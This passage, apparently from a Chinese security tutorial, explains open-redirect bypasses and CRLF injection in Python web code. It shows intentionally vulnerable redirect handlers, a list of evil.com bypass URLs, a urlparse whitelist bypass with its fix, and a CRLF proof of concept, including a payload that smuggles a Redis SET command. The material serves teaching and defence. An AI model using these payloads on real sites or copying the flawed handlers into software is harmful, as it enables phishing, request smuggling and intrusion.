## URL Bypass

url跳转，网站使用用户输入的地址，跳转到一个攻击者控制的网站，可能导致跳转过去的用户被精心设置的钓鱼页面骗走自己的个人信息和登录口令。比如一个简单的跳转形式。

```python
def urlbypass():
    if request.values.get('url'):
        url = request.values.get('url')
        return redirect(url)
```

再一些自定义的方法中，如果使用识别域名和路径没有做这些情况的处理。可能会导致域名的判断上出现绕过限制的情况。比如想限制域名为`baidu.com`二级域名

```python
def urlbypass():
    if request.values.get('url'):
        url = request.values.get('url')
        if url.endswith('baidu.com'):
            return redirect(url)
        else:
            return Response('不允许域名')
    else:
        return Response('请输入跳转的url')
```

如果是自定义方法来切割或者识别链接，也可能会导致以下的域名利用。

```
1. 单斜线"/"绕过
https://www.landgrey.me/redirect.php?url=/www.evil.com
2. 缺少协议绕过
https://www.landgrey.me/redirect.php?url=//www.evil.com
3. 多斜线"/"前缀绕过
https://www.landgrey.me/redirect.php?url=///www.evil.com
https://www.landgrey.me/redirect.php?url=////www.evil.com
4. 利用"@"符号绕过
https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com
5. 利用反斜线"\"绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me
6. 利用"#"符号绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me
7. 利用"?"号绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me
8. 利用"\\"绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me
9. 利用"."绕过
https://www.landgrey.me/redirect.php?url=.evil           (可能会跳转到www.landgrey.me.evil域名)
https://www.landgrey.me/redirect.php?url=.evil.com       (可能会跳转到evil.com域名)
10.重复特殊字符绕过
https://www.landgrey.me/redirect.php?url=///www.evil.com//..
https://www.landgrey.me/redirect.php?url=////www.evil.com//..
```

参考：https://landgrey.me/static/upload/2019-09-15/mofwvdcx.pdf

关于url bypass先提一下前面说到的`urllib`分割域名

```python
>>> urllib.parse.urlparse('http:www.baidu.com')
ParseResult(scheme='http', netloc='', path='www.baidu.com', params='', query='', fragment='')
>>> urllib.parse.urlparse('http:/www.baidu.com')
ParseResult(scheme='http', netloc='', path='/www.baidu.com', params='', query='', fragment='')
>>> urllib.parse.urlparse('/www.baidu.com')
ParseResult(scheme='', netloc='', path='/www.baidu.com', params='', query='', fragment='')
>>> urllib.parse.urlparse('//www.baidu.com')
ParseResult(scheme='', netloc='www.baidu.com', path='', params='', query='', fragment='')
>>> urllib.parse.urlparse('///www.baidu.com')
ParseResult(scheme='', netloc='', path='/www.baidu.com', params='', query='', fragment='')
>>> urllib.parse.urlparse('ht:888')
ParseResult(scheme='', netloc='', path='ht:888', params='', query='', fragment='')
>>> urllib.parse.urlparse('http:888')
ParseResult(scheme='http', netloc='', path='888', params='', query='', fragment='')
>>> urllib.parse.urlparse('https:888')
ParseResult(scheme='', netloc='', path='https:888', params='', query='', fragment='')
```

在`CVE-2017-7233`中，就是分割域名中，后面的判断没有做到完善的判断。导致`is_safe_url`的判断出错。

现在有一个地址，如果是域名则进行白名单跳转，如果是路径则直接在当前的路径访问。

```python
def BYPASS(request):
    if request.GET.get('url'):
        url = request.GET.get('url')    #https:3026530571
        if urllib.parse.urlparse(url).netloc and urllib.parse.urlparse(url).netloc in set_url:
            return HttpResponseRedirect(url)
        elif urllib.parse.urlparse(url).netloc == '':
            return HttpResponseRedirect(urllib.parse.urlparse(url).path)
        else:
            return HttpResponse('不允许域名')
    else:
        return HttpResponse('请输入url')
```

正常情况下，如果跳转需要一个协议加域名的形式，不然就是路径跳转，如果是域名跳转，还需要对比一个白名单，那么绕过白名单限制，同时还能跳转

```
https:3026530571   #3026530571是百度的一个IP十进制形式。
```

`urllib.parse.urlparse`来解析`https`开头，但是不规范的地址的时候，会一起解析为路径。从而绕过判断。但是跳转的时候，符合域名的形式，又可以进行域名跳转。

如果需要对以上的问题进行修复的话，只要使用全路径，跳转的时候加反斜线。

```python
def BYPASS(request):
    if request.GET.get('url'):
        url = request.GET.get('url')    #https:3026530571
        if urllib.parse.urlparse(url).netloc and urllib.parse.urlparse(url).netloc in set_url:
            return HttpResponseRedirect(url)
        elif urllib.parse.urlparse(url).netloc == '':
            path = urllib.parse.urlparse(url).path
            if path[0] == '/':
                return HttpResponseRedirect(path)
            else:
                path = '/'+path
                return HttpResponseRedirect(path)
        else:
            return HttpResponse('不允许域名')
    else:
        return HttpResponse('请输入url')
```

## CRLF

httplib模块、urllib模块等曾存在过CRLF问题。影响python3.7.3之前的版本。按照示例代码

```
import sys
import urllib
import urllib.request
import urllib.error


host = "127.0.0.1:7777?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123"
url = "http://"+ host + ":8080/test/?test=a"

try:
    info = urllib.request.urlopen(url).info()
    print(info)

except urllib.error.URLError as e:
    print(e)
```

监听7777端口，执行后会接收到这么一段请求他

```
GET /?a=1 HTTP/1.1
CRLF-injection: test
TEST: 123:8080/test/?test=a HTTP/1.1
Accept-Encoding: identity
Host: 127.0.0.1:7777
User-Agent: Python-urllib/3.7
Connection: close
```

常见的用处就是跟redis未授权访问写文件配合使用。

```
host = "10.251.0.83:6379?\r\nSET test success\r\n"
```



